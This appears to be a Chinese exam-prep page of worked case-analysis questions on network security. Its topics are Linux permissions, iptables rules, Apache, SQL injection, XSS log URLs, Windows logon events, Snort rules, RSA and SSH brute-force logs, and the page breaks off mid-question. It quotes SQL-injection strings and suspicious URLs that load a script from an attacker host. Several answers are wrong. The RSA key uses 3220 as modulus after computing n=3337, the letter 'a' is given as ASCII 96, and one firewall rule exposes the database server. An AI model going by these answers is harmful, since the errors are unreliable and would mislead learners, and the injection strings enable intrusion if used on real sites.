<p><a href="3%E5%88%86">问题4</a><br>目前很多单位已经使用国产操作系统，国产操作基于Linux，<br>1)系统用户账号加密口令的文件是什么?请给出文件名。</p>
<blockquote>
<p>&#x2F;etc&#x2F;shadow</p>
</blockquote>
<p>2)在保证Linux某些关键性文件安全时，需要修改文件属性，将inetd.conf文件属性修改为600的命令是什么?600表示的权限含义是什么?</p>
<blockquote>
<p>chmod 600 &#x2F;etc&#x2F;intd.conf </p>
<p>600表示仅有文件的拥有者能够对文件进行读、写操作</p>
</blockquote>
<p><a href="3%E5%88%86">问题5</a><br>方德方舟国产操作系统基于三权分立的管理机制，将普通操作系统中的超级管理员的权限分配给了(9)管理员、(10)管理员、(11)管理员，并形成了相互制约关系，防止管理员的恶意或偶然操作引起的系统安全问题。</p>
<blockquote>
<p>系统管理员</p>
<p>安全管理员</p>
<p>审计管理员</p>
</blockquote>
<h2 id="9"><a href="#9" class="headerlink" title="9-"></a>9-</h2><p>阅读下列说明和图，回答问题1至问题5,将解答填入答题纸的对应栏内<br>【说明】<br>某网络安全公司针对政府网站的保护要求，给出了相应的解决方案，并完成对应的网络安全透测试</p>
<p><a href="4%E5%88%86">问题1</a></p>
<p>1)根据国家有关政府门户网站的相关要求，政府网站的信息安全等级原则上不应低于二级，二级网站每几年测评一次?三级网站每几年测评一次?</p>
<blockquote>
<p>二级网站每两年测评一次</p>
<p>三级网站每一年测评一次</p>
</blockquote>
<p>2)网站管理部门根据安全需求，采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于几个月?</p>
<blockquote>
<p>网络日志不少于6个月</p>
</blockquote>
<p><a href="6%E5%88%86">问题2</a></p>
<p>假设网站有如下服务:<a href="http://duck/index.asp?category=food">http://duck/index.asp?category=food</a><br>其后台对应的web程序如下:<br>v cat &#x3D;request(category”)<br>Sqlstr&#x3D;”SELECT* FROM product WHERE Category&#x3D;”&amp; v cat &amp;”<br>Set rs&#x3D;conn.execute(salstr)<br>1)正常情况下，数据库对外部查询请求对应的执行程序语句是什么?用户能正常查询food相关信息。</p>
<blockquote>
<p>SELECT* FROM product WHERE Category&#x3D;”food”;</p>
</blockquote>
<p>2)如果一个恶意的用户提交htp:&#x2F;duck&#x2F;index.asp?category&#x3D;food’or 1&#x3D;1–，此时数据库对外部査询请求对应的执行程序语句是什么?将达到什么样的效果?</p>
<blockquote>
<p>SELECT* FROM product WHERE Category&#x3D;”food” or 1&#x3D;1–;</p>
<p>用户查询到product表的所有信息。</p>
</blockquote>
<p>3)说明该web程序存在什么攻击漏洞?防范方法有哪些?</p>
<blockquote>
<p>SQL注入攻击漏洞：</p>
<ul>
<li>对应用程序输入进行安全过滤；</li>
<li>设置应用程序最小化特权</li>
<li>屏蔽应用程序错误提示信息</li>
<li>对开源Web应用程序做安全适应性改造</li>
</ul>
</blockquote>
<p><a href="2%E5%88%86">问题3</a></p>
<p>在网络日志中，安全工程师发现了如下可疑URL:</p>
<p><a href="http://wy.gov.cn/ebanking?url-http://evilsite.com/phishing/fakepage.htm">http://wy.gov.cn/ebanking?url-http://evilsite.com/phishing/fakepage.htm</a></p>
<p><a href="http://wy.gov.cn/ebanking?page=1&client=%5C">http://wy.gov.cn/ebanking?page=1&amp;client=\</a>&lt;script&gt;evilcode</p>
<p><a href="http://wy.gov.cn/ebanking?page=l&response=evilsite.com%252levilcode.js&go=2">http://wy.gov.cn/ebanking?page=l&amp;response=evilsite.com%2levilcode.js&amp;go=2</a></p>
<p>安全工程师初步判断可疑URL存在什么攻击?</p>
<blockquote>
<p>跨站脚本攻击</p>
</blockquote>
<p><a href="8%E5%88%86">问题4</a></p>
<p>网站服务器使用Linux系统，使用Apache Web程序。<br>1)Apache安装后默认设置的文件宿主和权限都是比较合理和安全的，但是如果需要修改文件的拥有者，可使用什么命令?</p>
<blockquote>
<p>chown</p>
</blockquote>
<p>2)Apache的主配置文件是什么?(请写出文件名)</p>
<blockquote>
<p>httpd.conf</p>
</blockquote>
<p>3)Apache提供一个记录所有访问请求的机制,而且错误的请求也会记录。这些请求记录存放在哪两个文件中?</p>
<blockquote>
<p>accesslog</p>
<p>errorlog</p>
</blockquote>
<h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><p>试题一(共20分)<br>阅读下列说明和图，回答问题1至问题5，将解答填入答题纸的对应栏内</p>
<p>【说明】</p>
<p>已知某公司网络环境结构主要由三个部分组成，分别是DMZ区、内网办公区和生产区，其拓扑结构如图1-1所示。信息安全部的王工正在按照等级保护2.0的要求对部分业务系统开展安全配置，图1.-1当中，网站服务器的!P地址是192.168.70.140，数据库服务器的IP地址是192.168.70.141，信息安全部计算机所在网段为192.168.1.124王工所使用的办公电脑IP地址为192.168.11.2。</p>
<img src="https://gitee.com/kingwempity/images/raw/master/images/屏蔽子网网络结构.png" alt="屏蔽子网网络结构" style="zoom:50%;">

<p><a href="2%E5%88%86">问题1</a></p>
<p>为了防止生产网受到外部的网络安全威胁，安全策略要求生产网和其他网之间部署安全隔离装置，隔离强度达到接诉物理隔离。请问图中X最有可能代表的安全设备是什么?</p>
<blockquote>
<p>网闸</p>
</blockquote>
<p><a href="2%E5%88%86">问题2</a><br>防火墙是网络安全区域边界保护的重要技术，防火墙防御体系结构主要有基于双宿主主机防火墙、基于代理型防火墙和基于屏蔽子网的防火墙，图1-1拓扑图中的防火墙布局属于哪种体系结构类型?</p>
<blockquote>
<p>基于屏蔽子网的防火墙</p>
</blockquote>
<p><a href="2%E5%88%86">问题3</a><br>通常网络安全需要建立四道防线，第一道是保护，阻止网络入侵;第二道是监测，及时发现入侵和破坏;第三道是响应，攻击发生时确保网络打不塆;第四道是恢复，使网络在遭受攻击时能以最快速度起死回生。请问拓扑图1-1中防火墙1属于第几道防线?</p>
<blockquote>
<p>第一道防线</p>
</blockquote>
<p><a href="6%E5%88%86">问题4</a><br>图1-1中防火墙1和防火墙2都采用Ubuntu系统自带的iptables防火墙，其默认的过滤规则如图1-2所示</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/Ubuntu%E7%B3%BB%E7%BB%9Fiptables%E8%A7%84%E5%88%99.png" alt="Ubuntu系统iptables规则"></p>
<p>(1)请说明上述防火墙采取的是白名单还是黑名单安全策略。</p>
<blockquote>
<p>黑名单</p>
<p>【说明】</p>
<p><strong>黑名单安全策略</strong>:当链的默认策路为ACCEPT时，链中的规则对应的动作应该为DROP或者REJECT，表示只有匹配到规则的报文才会被拒色，没有被规则匹配到的报文都会被默认接受。</p>
<p><strong>白名单安全策略</strong>:当链的默认策略为DROP时，链中的规则对应的动作应该为ACCEPT，表示只有匹配到规则的报文才会被放行，没有被规则匹配到的报文都会被默认拒绝。</p>
</blockquote>
<p>(2)图1-2显示的是iptables哪个表的信息，请写出表名。</p>
<blockquote>
<p>Filter表</p>
<p>【说明】</p>
<p>在iptables中内建的规则表有三个:nat、mangle和filter。这三个规则表的功能如下:</p>
<ul>
<li>nat:此规则表拥有prerouting和postrouting两个规则链，主要功能是进行一对一、一对多、多对多等地址转换工作(snat、dnat)，这个规则表在网络工程中使用得非常频繁。</li>
<li>mangle:此规则表拥有prerouting、forward和postrouting三个规则链。除了进行网络地址转换外，还在某些特殊应用中改写数据包的t、t0s的值等，这个规则表使用得很少，因此在这里不做过多讨论。</li>
<li>filter:这个规则表是默认规则表，拥有input、forward和output三个规则链，它是用来进行数据包过滤的处理动作(如drop、accept或reject等)，通常的基本规则都建立在此规则表中。</li>
</ul>
</blockquote>
<p>(3)如果要设置iptables防火墙默认不允许任何数据包进入，请写出相应命令</p>
<blockquote>
<p>iptables -P FORWARD DROP</p>
</blockquote>
<p><a href="8%E5%88%86">问题5</a><br>DMZ区的网站服务器是允许互联网进行访问的，为了实现这个目标，王工需要对防火墙1进行有效配置。同时王工还需要通过防火墙2对网站服务器和数据库服务器进行日<br>常运维。<br>(1)防火墙1应该允许哪些端口通过?</p>
<blockquote>
<p>网站服务器实现的是web服务，对应的是HTTP服务和HTTPS服务，对应端口为80和443端口</p>
</blockquote>
<p>(2)请编写防火墙1上实现互联网只能访问网站服务器的iptables过滤规则。</p>
<blockquote>
<p>iptables -P FORWARD DROP</p>
<p>iptables -A FORWARD -d 192.168.70.140 -p tcp –dport 80 -j ACCEPT</p>
<p>iptables -A FORWARD -d 192.168.70.141 -p tcp –dport 80 -j ACCEPT</p>
</blockquote>
<p>(3)请写出王工电脑的子网掩码。</p>
<blockquote>
<p>255.255.255.0</p>
</blockquote>
<p>(4)为了使王工能通过SSH协议远程运维DMZ区中的服务器，请编写防火墙2的iptables过滤规则。</p>
<blockquote>
<p>iptables -t filter -A FORWARD -s 192.168.11.2 -d 192.168.70.140&#x2F;24 -p tcp –dport 22 -j ACCEPT</p>
<p>iptables -t filter -A FORWARD -s 192.168.70.140&#x2F;24 -d 192.168.11.2 -p tcp –sport 22 -j ACCEPT</p>
</blockquote>
<h2 id="11"><a href="#11" class="headerlink" title="11-"></a>11-</h2><p>阅读下列说明，<br>回签问题1至问题5<br>将解箜填入签锁纸的对应栏内<br>【说明】<br>Linux系统中所有内容都是以文件的形式保存和管理的，即一切皆文件。普通文本、音视频、二讲制程序是文件，目录是文件，硬件设备(键盘、监视器、硬盘、打印机)是文件，就连网络套接字等也都是文件。在Linux Ubuntu系统下执行is -1命令后显示的结果如图2-1所示。</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%9010-1.png" alt="案例分析10-1"></p>
<p><a href="2%E5%88%86">问题1</a>请问执行上述命令的用户是普通用户还是超级用户?</p>
<blockquote>
<p>普通用户</p>
</blockquote>
<p><a href="3%E5%88%86">问题2</a><br>(1)请给出图2-1中属于普通文件的文件名</p>
<blockquote>
<p>crond.pid </p>
<p>abc</p>
</blockquote>
<p>(2)请给出图2-1中的目录文件名。</p>
<blockquote>
<p>openvpn</p>
</blockquote>
<p>(3)请给出图2-1中的符号链接文件名,</p>
<blockquote>
<p>sh-&gt;&#x2F;dev&#x2F;shm</p>
</blockquote>
<p><a href="2%E5%88%86">问题3</a><br>符号链接作为Linux系统中的一种文件类型，它指向计算机上的另一个文件或文件夹。符号链接类似于Windows中的快捷方式。如果要在当前目录下，创建图2-1中所示的符号链接，请给出相应命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s dev/shm shm</span><br></pre></td></tr></table></figure>

<p><a href="3%E5%88%86">问题4</a></p>
<p>当源文件(或目录)被移动或者被删除时，指向它的符号链接就会失效。</p>
<p>(1)请给出命令，实现列出&#x2F;home目录下各种类型(如:文件、目录及子目录)的所有失效链接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find /home -xtype l -<span class="built_in">print</span></span><br></pre></td></tr></table></figure>

<p>(2)在(1)基础上，完善命令以实现删除所有失效链接。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find /home -xtype l -<span class="built_in">exec</span> <span class="built_in">rm</span> &#123;&#125; \</span><br></pre></td></tr></table></figure>

<p><a href="10%E5%88%86">问题5</a><br>Linux系统的权限模型由文件的所有者、文件的组、所有其他用户以及读(r)、写(w)、执行(x)组成.<br>(1)请写出第一个文件的数字权限表示;</p>
<blockquote>
<p>755</p>
</blockquote>
<p>(2)请写出最后一个文件的数字权限表示;</p>
<blockquote>
<p>755</p>
</blockquote>
<p>(3)请写出普通用户执行最后一个文件后的有效权限</p>
<blockquote>
<p>可读、不可写、可执行</p>
</blockquote>
<p>(4)请给出去掉第一个文件的’x’权限的命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chomd 644 openvpn</span><br></pre></td></tr></table></figure>

<p>(5)执行(4)给出的命令后，请说明root用户能否进入该文件</p>
<blockquote>
<p>去掉x可执行权限后，root对该文件可读可写但不能执行，则无法进入该文件。</p>
</blockquote>
<h2 id="12-2021年试题三"><a href="#12-2021年试题三" class="headerlink" title="12-2021年试题三"></a>12-2021年试题三</h2><p>试题三(共18分)<br>阅读下列说明和图，回答问题1至问题9，将解答填入答题纸的对应栏内。<br>【说明】<br>Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检査错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。</p>
<p>有一天，王工在夜间的例行安全巡检过程中，发现有异常日志告警，通过査看NTA全流量分析设备，找到了对应的可疑流量，请分析其中可能的安全事<br>件。</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%9012-1.png" alt="案例分析12-1"></p>
<p><a href="2%E5%88%86">问题4</a><br>Windows系统通过事件ID来记录不同的系统行为，图3-1的事件!D为4625，请结合任务类别，判断导致上述日志的最有可能的情况</p>
<blockquote>
<p>B.网络失败登录</p>
<p>【说明】</p>
<p>4624表示登录成功、4625表示登录失败</p>
<p>3389为远程桌面端口</p>
</blockquote>
<p>备选项:<br>A.本地成功登录<br>B.网络失败登录<br>C.网络成功登录<br>D.本地失败登录</p>
<p><a href="2%E5%88%86">问题5</a><br>王工通过对攻击流量的关联分析定位到了图3-2所示的网络分组，请指出上述攻击针对的是哪一个端口。</p>
<blockquote>
<p>3389端口</p>
</blockquote>
<p><a href="2%E5%88%86">问题6</a><br>如果要在Wireshark当中过滤出上述流量分组，请写出在显示过滤框中应输入的过滤表达式</p>
<blockquote>
<p>ip.addr &#x3D;&#x3D; 192.168.69.69 and ip.addr &#x3D;&#x3D; 192.168.1.100</p>
</blockquote>
<p><a href="2%E5%88%86">问题7</a><br>Windows系统为了实现安全的远程登录使用了1s协议，请问图3-2中，服务器的数字证书是在哪一个数据包中传递的?通信双方是从哪一个数据包开始传递加密数据的?请给出对应数据包的序号。</p>
<blockquote>
<p>服务器数字证书在序号12162的数据包中传递；【12162中的 Certificate】</p>
<p>通信双方是从序号为12168的数据包开始传递加密数据的；</p>
</blockquote>
<p><a href="2%E5%88%86">问题8</a><br>网络安全事件可分为有害程序事件、网络攻击事件、信息破坏事件、信息内容安全事件、设备设施故障、灾害性事件和其他事件。请问上述攻击属于哪-种网络安全事件?</p>
<blockquote>
<p>网络攻击事件</p>
</blockquote>
<p><a href="2%E5%88%86">问题9</a><br>此类攻击针对的是三大安全目标即保密性、完整性、可用性中的哪一个?</p>
<blockquote>
<p>针对保密性</p>
<p>【说明】</p>
<p>判定为利用3389端口进行的暴力密码攻击，针对保密性。</p>
</blockquote>
<h2 id="13-2021年试题四"><a href="#13-2021年试题四" class="headerlink" title="13-2021年试题四"></a>13-2021年试题四</h2><p>试题四(共17分)<br>阅读下列说明，回答问题1至问题5，将解答填入答题纸的对应栏内。</p>
<p>【说明】<br>网络安全侧重于防护网络和信息化的基础设施，特别重视重要系统和设施、关键信息基础设施以及新产业、新业务和新模式的有序和安全。数据安全侧重于保障数据在开放、利用、流转等处理环节的安全以及个人信息隐私保护。网络安全与数据安全紧密相连，相辅相成。数据安全要实现数据资源异常访问行为分析，高度依赖网络安全日志的完整性数据安全已经进入法制化时代。随着网络安全法和数据安全法的落地，</p>
<p><a href="6%E5%88%86">问题1</a></p>
<p>2022年7月21日，自国家互联网信息办公室公布的对滴滴全球股份有限公司依法做出网络安全审查相关行政处罚的决定，开出了80.26亿的罚单，请分析一下，滴滴全球股份有限公司违反了哪些网络安全法律法规?</p>
<blockquote>
<p>《中华人民共和国网络安全法》</p>
<p>《中华人民共和国数据安全法》</p>
<p>《中华人民共和国个人信息保护法》</p>
</blockquote>
<p><a href="2%E5%88%86">问题2</a><br>根据《中华人民共和国数据安全法》，数据分类分级已经成为企业数据安全治理的必选题<br>一般企业按数据敏感程度划分，数据可以分为一级公开数据，级内部数据、三级秘密数据、四级机密数据。请问，一般员工个人信息属于几级数据?</p>
<blockquote>
<p>一般员工个人信息属于三级秘密数据</p>
</blockquote>
<p><a href="2%E5%88%86">问题3</a><br>隐私可以分为身份隐私、属性隐私、社交关系隐私、位置轨迹隐私等几大类，请问员工的薪水属于哪一类隐私?</p>
<blockquote>
<p>员工的薪水属于属性隐私</p>
</blockquote>
<p><a href="2%E5%88%86">问题4</a><br>隐私保护常见的技术措施有抑制、泛化、置换、扰动和裁剪等。若某员工的月薪为8750元，经过脱敏处理后，显示为5k~10k，这种处理方式属于哪种技术措施?</p>
<blockquote>
<p>属于泛化技术</p>
</blockquote>
<p><a href="5%E5%88%86">问题5</a><br>密码学技术也可以用于实现隐私保护，利用加密技术阻止非法用户对隐私数据的未授权访问和滥用。若某员工的用户名为”admin”，计划用RSA对用户名进行加密，假设选取的两个素数p&#x3D;47，q&#x3D;71，公钥加密指数e&#x3D;3。<br>请问:<br>(1)上述RSA加密算法的公钥是多少?</p>
<p>$$n&#x3D;p<em>q&#x3D;47</em>71&#x3D;3337$$</p>
<p>$$\phi&#x3D;(p-1)<em>(q-1)&#x3D;46</em>70&#x3D;3220$$</p>
<p>$$e*d &#x3D; 1 mod\ \phi$$</p>
<p>$$3\ d&#x3D; 1 mod 3220$$</p>
<p>$$d&#x3D;2147$$</p>
<blockquote>
<p>RSA的加密算法的公钥(e,n)是（3，3220）</p>
<p>RSA加密算法的私钥(d,n)是（2147，3220）</p>
</blockquote>
<p>(2)请给出上述用户名的16进制表示的整数值。</p>
<blockquote>
<p>0x61646D696E</p>
<p>【说明】</p>
<p>a的ASCII值为96，但需要转换成16进制为0x61</p>
</blockquote>
<p>(3)直接利用(1)中的公钥对(2)中的整数值进行加密是否可行?请简述原因。</p>
<blockquote>
<p>不可行，明文长度不能超过模式n</p>
</blockquote>
<p>(4)请写出对该用户名进行加密的计算公式。</p>
<p>$$C\ &#x3D;\ M^e\ mod\ n$$</p>
<h2 id="14-2021年试题一"><a href="#14-2021年试题一" class="headerlink" title="14-2021年试题一"></a>14-2021年试题一</h2><p>试题一(共20分)<br>阅读下列说明和图，回答问题1至问题5，将解答填入答题纸的对应栏内。<br>【说明】<br>在某政府单位信息中心工作的李工要负责网站的设计、开发工作。为了确保部门新业务的顺利上线，李工邀请信息安全部门的干工按照等级保护2.0的要求对其开展安全测评，李工提供网站所在的网络拓扑图如图1-1所示，图中，网站服务器的!P地址是192.168.70.140，数据库服务器的IP地址是192.168.0.141.</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%9014-1.png" alt="案例分析14-1"></p>
<p>王工接到网站安全测评任务以后，决定在内网办公区的信息安全部开展各项运维工作，王工使用的办公电脑|P地址为192.168.11.2。</p>
<p><a href="2%E5%88%86">问题1</a><br>按照等级保护2.0的要求，政府网站的定级不应低于几级?该等级的测评每几年开展一次?</p>
<blockquote>
<p>政府网站的定级不应低于二级，每两年测评一次</p>
</blockquote>
<p><a href="6%E5%88%86">问题2</a><br>按照网络安全测评的实施方式，测评主要包括安全功能检测、安全管理检测、代码安全审查、安全渗透、信息系统攻击测试等。王工调阅了部分网站后台处理代码，发现网站某页面的数据库<br>查询代码存在安全漏洞，代码如下:</p>
<img src="https://gitee.com/kingwempity/images/raw/master/images/案例分析14-2.png" alt="案例分析14-2" style="zoom:67%;">

<p>(1)请问上述代码存在哪种漏洞?</p>
<blockquote>
<p>SQL注入漏洞</p>
</blockquote>
<p>(2)为了进一步验证自己的判断，王工在该页面的编辑框中输入了漏洞测试语句，发起测试。请问王工最有可能输入的测试语句对应以下哪个选项?</p>
<blockquote>
<p>C. 	I’ or 1&#x3D;1 order by 1 #</p>
</blockquote>
<p>A. 	or 1&#x3D;1–order by 1</p>
<p>B. 	1 or’1’&#x3D;’1’&#x3D;1 order by 1#  </p>
<p>C. 	I’ or 1&#x3D;1 order by 1# </p>
<p>D. 	1’and’1’&#x3D;’2’order by 1#<br>(3)根据上述代码，网站后台使用的哪种数据库系统?</p>
<blockquote>
<p>MySql数据库系统</p>
</blockquote>
<p>(4)王工对数据库中保存口令的数据表进行检查的过程中，发现口令为明文保存，遂给出整改建议，建议李工对源码进行修改，以加强口令的安全防护，降低敏感信息泄露风险。下面给出四种在数据库中保存口令信息的方法，李工在安全实践中应采用哪一种方法?</p>
<blockquote>
<p>C.哈希加盐</p>
</blockquote>
<p>A.Base64 	B.MD5 	C.哈希加盐	D.加密存储</p>
<p><a href="2%E5%88%86">问题3</a><br>按照等级保护2.0的要求，系统当中没有必要开放的服务应当尽量关闭。王工在命令行窗口运行了一条命令，查询端口开放情况。请给出王工所运行命令的名字。</p>
<blockquote>
<p>netstat </p>
</blockquote>
<p><a href="2%E5%88%86">问题4</a><br>防火墙是网络安全区域边界保护的重要技术，防火墙防御体系结构主有基于双宿主机防火墙、基于代理型防火增和基于屏蔽子网的防火墙。图1-1拓扑图中的防火墙布局属于哪种体系结构类型?</p>
<blockquote>
<p>属于基于屏蔽子网的防火墙</p>
</blockquote>
<p><a href="8%E5%88%86">问题5</a><br>根据李工提供的网络拓扑图，王工建议部署开源的Snort入侵检测系统以提高整体的安全检测和态势感知能力。<br>(1)针对王工建议，李工查阅了入侵检测系统的基本组成和技术原理等资料。请问以下有关Snort入侵检测系统的描述哪两项是正确的?(2分)<br>A.基于异常的检测系统 									 B.基于误用的检测系统<br>C.基于网络的入侵检测系统					    	D.基于主机的入侵检测系统</p>
<blockquote>
<p>B.基于误用的检测系统</p>
<p>C.基于网络的入侵检测系统</p>
</blockquote>
<p>(2)为了部署Snort入侵检测系统，李工应该把入侵检测系统连接到图1-1网络拓扑中的哪台交换机?(1分)</p>
<blockquote>
<p>交换机2</p>
</blockquote>
<p>(3)李工还需要把网络流量导入入侵检测系统才能识别流量中的潜在攻击。图1-1中使用的均为华为交换机，李工要将交换机网口GigabitEthernet1&#x2F;0&#x2F;2的流量镜像到部署 Snort的网口 GigabitEthernet1&#x2F;0&#x2F;1上，他应该选择下列选项中哪一个配置?(2分)</p>
<blockquote>
<p>D</p>
</blockquote>
<p>A.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">observe-port 1interface GiqabitEthernet1/0/2</span><br><span class="line">interface GigabitEthemet1/0/1</span><br><span class="line">port-mirroring to observe-port 1 inbound/outbound/both</span><br></pre></td></tr></table></figure>

<p>B.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">observe-port 2 interface GiqabitEthernet1/0/2</span><br><span class="line">interface GigabitEthemet1/0/1</span><br><span class="line">port-mirroring to observe-port 1 inbound/outbound/both</span><br></pre></td></tr></table></figure>

<p>C.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">port-mirroring to observe-port 1 inbound/outbound/both</span><br><span class="line">observe-port 1interfaceGiqabiEthenet1/0/2</span><br><span class="line">interface GigabitEthenet1/0/1</span><br></pre></td></tr></table></figure>

<p>D.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">observe-port 1interface GiqabitEthernet1/0/1</span><br><span class="line">interface GiqabitEthemet1/0/2</span><br><span class="line">port-mirrorina to observe-port 1 inbound/outbound/both</span><br></pre></td></tr></table></figure>

<p>(4)Snort入侵检测系统部署不久，就发现了一起网络攻击。李工打开攻击分组查看，发现很多字符看起来不像是正常字母，如图下图所示，请问该用哪种编码方式去解码该网络分组内容?(1分)</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%9014-3.png" alt="案例分析14-3"></p>
<blockquote>
<p>URL编码（URL encode）</p>
</blockquote>
<p>(5)针对图上图所示的网络分组，李工查看了该攻击对应的Snort 检测规则，以更好地掌握Snort入侵检测系统的工作机制。请完善以下规则，填充空(a)、(b)处的内容。(2分)<br>(a) tcp any any -&gt;any any ( msg:”XXX”;content:” (b) “; nocase ; sid : 1106 ; )</p>
<blockquote>
<p>(a)alert				(b)union,select</p>
<p>alert tcp any any -&gt;any any ( msg : “XXX” ; content : “ union , select “ ; nocase ; sid : 1106)</p>
<p>【说明】考查Snort基本规则编写。</p>
<p>(a)表示Snort的规则行为，由于需要告警并记录数据，所以填alert。</p>
<p>(b)属于Snort 的规则选项部分，李工目标是发现分组中出现的union select关键字，就要触发告警信息。</p>
</blockquote>
<h2 id="15-2021年试题二"><a href="#15-2021年试题二" class="headerlink" title="15-2021年试题二"></a>15-2021年试题二</h2><p>试题二(共20分)<br>阅读下列说明，回答问题1至问题5，将解答填入答题纸的对应栏内，<br>【说明】通常由于机房电磁环境复杂，运维人员很少在现场进行运维工作，在出现安全事件需要紧急处理时，需要运维人员随时随地远程开展处置工作。<br>SSH(安全外壳协议)是一种加密的网络传输协议，提供安全方式访问远程计算机。李工作为公司的安全运维工程师，也经常使用SSH远程登录到公司的Ubuntu18.04服务器中进行安全维护。</p>
<p><a href="2%E5%88%86">问题1</a></p>
<p>SSH协议默认工作的端口号是多少?</p>
<blockquote>
<p>22端口</p>
</blockquote>
<p><a href="2%E5%88%86">问题2</a><br>网络设备之间的远程运维可以采用两种安全通信方式:一种是SSH，还有一种是什么?</p>
<blockquote>
<p>Stelnet方式</p>
<p>【说明】</p>
<p>Stelnet是Secure Telnet的简称。在一个传统不安全的网络环境中，服务器通过对用户认证及双向的数据加密，为终端用户提供安全的Telnet服务。</p>
</blockquote>
<p><a href="4%E5%88%86">问题3</a></p>
<p>日志包含设备、系统和应用软件的各种运行信息，是安全运维的重点关注对象。李工在定期巡检服务器的SSH日志时，发现了以下可疑记录:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Jul 22 17: 17: 52 humen systed-logiad [1182] : Waching sytem buttons on/dev/input/evet0 (Power Button)</span><br><span class="line">Jul 22 17: 17: 52 humen systed-logiad [1182] : Waching sytem buttons on/dev/inputlevet1(AT Translated Set 2 keyboard)</span><br><span class="line">Jul 23 09: 33: 41 humen sshd [5423] :pam unix (sshd:auth) authentication falure, logame= uid=0 euid=0 ty=ssh</span><br><span class="line">ruser=rhost=192.168.107.130 user=humen</span><br><span class="line">Jul 23 09: 33: 43 humen sshd [5423] :Failed password <span class="keyword">for</span> humen from 192.168.107.130 port 40231 ssh2</span><br><span class="line">Jul 23 09: 33: 43 humen sshd [5423] :Connection closed by authenticating user humen 192.168.107.130 port 40231[reauth]</span><br><span class="line">Jul 23 09: 33: 43 humen sshd [5425] :pam unix (sshd:auth) :authentication failure; <span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh</span><br><span class="line">ruser=rhost=192.168.107.130 user=humen</span><br><span class="line">Jul 23 09: 33: 45 humen sshd [5425]: Failed password <span class="keyword">for</span> humen from 192.168.107.130 port 37223 ssh2</span><br><span class="line">Jul 23 09: 33: 45 humen sshd [54251 : Connection closed by authenticating user humen192.168.107.130 port 37223 [preauth]</span><br><span class="line">Jul 23 09: 33: 45 humen sshd [5427] : pam unix (sshd:auth) :authentication failure;<span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh</span><br><span class="line">ruser=rhost=192.168.107.130 user=humen</span><br><span class="line">Jul 23 09: 33: 47 humen sshd [5427] : Failed password <span class="keyword">for</span> humen from 192.168.107.130 port 41365 ssh2</span><br><span class="line">Jul 23 09: 33: 47 humen sshd [5427] :Connection closed by authenticaing user humen 192.168.107.130 port 41365 [preauth]</span><br><span class="line">Jul 23 09: 33: 47 humen sshd [5429] : pam unix (sshd:auth) :authentication falure;<span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh</span><br><span class="line">ruser=rhost=192.168.107.130 user=humen</span><br><span class="line">Jul 23 09: 33: 49 humen sshd [5429] : Failed password <span class="keyword">for</span> humen from 192.168.107.130 port 45627 ssh2</span><br><span class="line">Jul 23 09: 33: 49 humen sshd [5429] :Connection closed by authenticating user humen 192.168.107.130 port 45627 [preauth]</span><br><span class="line">Jul 23 09: 33: 49 humen sshd [5431] : pam unix (sshd:auth) :authentication failure;<span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh</span><br><span class="line">ruser=rhost=192.168.107.130 user=humen</span><br><span class="line">Jul 23 09: 33: 51 humen sshd [5431]: Failed password <span class="keyword">for</span> humen from192.168.107.130 port 42271 ssh2</span><br><span class="line">Jul 23 09: 33: 51 humen sshd [5431] :Connection closed by authenticaing user humen 192.168.107.130 port 42271 [preauth]</span><br><span class="line">Jul 23 09: 33: 51 humen sshd [5433] : pam unix (sshd:auth) :authentication failure;<span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh</span><br><span class="line">ruser=rhost=192.168.107.130 user=humen</span><br><span class="line">Jul 23 09: 33: 53 humen sshd [5433] : Failed password <span class="keyword">for</span> humen from 192.168.107.130 port 45149 ssh2</span><br><span class="line">Jul23 09: 33: 53 humen sshd [5433l :Connection closed by authenticating user humen 192.168.107.130 port 45149 [preauth]</span><br><span class="line">Jul 23 09: 33:54 humen sshd [5435] :Accepted password <span class="keyword">for</span> humen from 192.168.107.130 port 45671 ssh2</span><br><span class="line">Jul 23 09: 33: 54 humen sshd [5435]: pam unix (sshd:auth) : session opened <span class="keyword">for</span> user humen by (uid=0)</span><br></pre></td></tr></table></figure>

<p>(1)请问李工打开的系统日志文件的路径和名称?</p>
<blockquote>
<p>路径：&#x2F;var&#x2F;log   名称：&#x2F;var&#x2F;log&#x2F;secure</p>
</blockquote>
<p>(2)李工怀疑有黑客在攻击该系统，请给出判断攻击成功与否的命令以便李工评估攻击的影响,。</p>
<blockquote>
<p>日志文件包含”Accepted password for humnen”命令，可以判断登录成功。</p>
</blockquote>
<p><a href="10%E5%88%86">问题4</a><br>经过上次SSH的攻击事件之后，李工为了加强口令安全，降低远程连接风险，考虑采用免密证书登录。</p>
<p>(1)Linux系统默认不允许证书方式登录，李工需要实现免密证书登录的功能，应该修改哪个配置文件?请给出文件名。</p>
<blockquote>
